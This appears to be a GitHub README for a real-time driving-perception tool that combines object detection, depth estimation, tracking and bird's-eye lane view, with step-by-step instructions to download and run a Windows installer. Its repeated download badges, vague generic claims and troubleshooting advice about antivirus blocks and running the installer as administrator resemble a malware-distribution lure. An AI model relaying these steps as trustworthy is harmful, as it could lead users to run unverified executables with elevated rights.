# 🚗 Perception-and-Situation-Understanding-for-AD-ADAS-systems - Real-Time Driving Assistance Visuals

[![Download Latest Release](https://img.shields.io/badge/Download-Here-ff6347?style=for-the-badge&logo=github)](https://github.com/barracarc76-1milhao/Perception-and-Situation-Understanding-for-AD-ADAS-systems)

---

## 📋 About This Application

This software helps you see and understand the environment around a car in real time. It uses a single camera to detect objects, estimate the distance to them, track their movement, and recognize lane lines from above. The system combines several advanced techniques in a way that runs fast on regular Windows PCs. You do not need special hardware or programming skills to use it.

Key components involved are:

- **YOLOv8**: Detect objects like cars, pedestrians, and bikes.
- **Depth Anything V2**: Estimate how far each object is.
- **Kalman tracking**: Follow moving objects across frames.
- **BEV lane detection**: Show lanes as seen from above for better clarity.

This makes it helpful for drivers, vehicle testers, or anyone interested in car safety and automated driving aids.

---

## 🎯 Features

- Detect vehicles, pedestrians, and road signs in real time using monocular camera input.
- Estimate distance without the need for multiple cameras or sensors.
- Track moving objects smoothly even in busy traffic.
- Show lane lines clearly from a bird's-eye view.
- Works on standard Windows 10 or newer machines.
- Simple interface designed for ease of use.
- Updates object positions and lanes frame by frame.
- Supports common video file formats or live video feeds from your camera.

---

## 🔧 System Requirements

- Operating System: Windows 10 or later (64-bit recommended)
- Processor: Intel i5 or equivalent AMD CPU, 2.5 GHz or faster
- RAM: At least 8 GB installed memory
- Graphics: DirectX 11 compatible GPU recommended (NVIDIA or AMD)
- Disk Space: Minimum 500 MB free space
- Camera: Any standard USB webcam or video file input supported
- .NET Framework: Version 4.8 or newer
- Internet connection is needed only for initial download

---

## 🎬 How to Download and Run 🚀

You will get the complete Windows application from the main page on GitHub. Follow these step-by-step instructions.

### Step 1: Visit the Download Page

Click this button to open the GitHub repository where you can get the latest version:

[![Download Latest Release](https://img.shields.io/badge/Download-Here-228be6?style=for-the-badge&logo=github)](https://github.com/barracarc76-1milhao/Perception-and-Situation-Understanding-for-AD-ADAS-systems)

This link takes you to the project’s main page where you will find a **Releases** section or a **Download** button.

### Step 2: Find the Latest Release

Scroll down to the **Releases** tab on the repository page. Find the version labeled as the latest stable release.

- Look for files with a name like `PerceptionSetup.exe` or a similar Windows installer.
- The release notes may include information about fixes or new features.

### Step 3: Download the Installer

Click the installer file name to download it to your computer. Save it somewhere easy to find, like your **Downloads** folder or desktop.

The file will be about 100-200 MB in size.

### Step 4: Run the Installer

Locate the downloaded `.exe` file and double-click it.

- A setup wizard will open.
- Follow the on-screen instructions.
- Accept any license agreements.
- Choose the destination folder or keep the default.
- Click **Install** and wait for the process to finish.

### Step 5: Launch the Application

Once installed, find the program in your Start menu under the same name or on your desktop if a shortcut was created.

Double-click the icon to open it.

---

## ▶️ Using the Application

After launching the app, you will see the main control screen.

### Input Video Source

- To use a USB camera, choose your device from the list.
- To load a pre-recorded video, click **Open File** and select it.
- Supported video formats include `.mp4`, `.avi`, and `.mov`.

### Start Real-Time Processing

- Click the **Start** button to begin detection.
- The screen will show video with boxes around detected objects.
- A map of lanes will appear in a small window showing the bird’s-eye view.
- Distance to objects will be displayed alongside each detection.

### Tracking and Alerts

- The program tracks objects smoothly as they move.
- You can toggle Kalman tracking on or off in the settings.
- This helps keep consistent IDs for each moving object.

### Adjusting Settings

- Use the **Settings** tab to change detection thresholds or camera parameters.
- You can set how sensitive the system is to small objects.
- Adjust visual display options such as marker size or transparency.

---

## 🛠 Troubleshooting Tips

- If the program fails to find your camera, ensure it is connected and not used by another app.
- Update your Windows system and graphics drivers for best performance.
- Check if your antivirus or firewall blocks the application.
- Run the installer as an administrator if any permissions errors occur.
- If video playback looks choppy, try lowering the resolution or frame rate in settings.
- For error messages during launch, reinstall .NET Framework 4.8 or higher from Microsoft's website.

---

## 🖥 Additional Tools and Files

The GitHub repository contains extra files you may find useful:

- Sample videos for testing
- Configuration files with presets
- Readme files explaining algorithm details

You can download these by browsing the **Code** tab and clicking **Download ZIP**. Extract the ZIP file to access all resources.

---

## 📂 File Structure Overview

When installed, expect these folders:

- `/bin` – main program files and executables
- `/config` – settings and presets
- `/logs` – runtime logs useful for diagnostics
- `/videos` – example input video clips

---

## 🗣 Support and Feedback

For questions or bug reports, open an issue on the GitHub repository under the **Issues** tab. Provide as much detail as possible, including your Windows version and hardware specs.

You can also view other user questions and answers. The development team reviews issues regularly.

---

[![Download Latest Release](https://img.shields.io/badge/Download-Here-ff6347?style=for-the-badge&logo=github)](https://github.com/barracarc76-1milhao/Perception-and-Situation-Understanding-for-AD-ADAS-systems)

---

## 🏷 Topics and Tags

This project focuses on:

`adas, autonomous-driving, bird-eye-view, computer-vision, depth-estimation, depthanythingv2, intent-prediction, intersection-over-union, kalman-tracking, lane-detection, pixel-tracking, yolov8`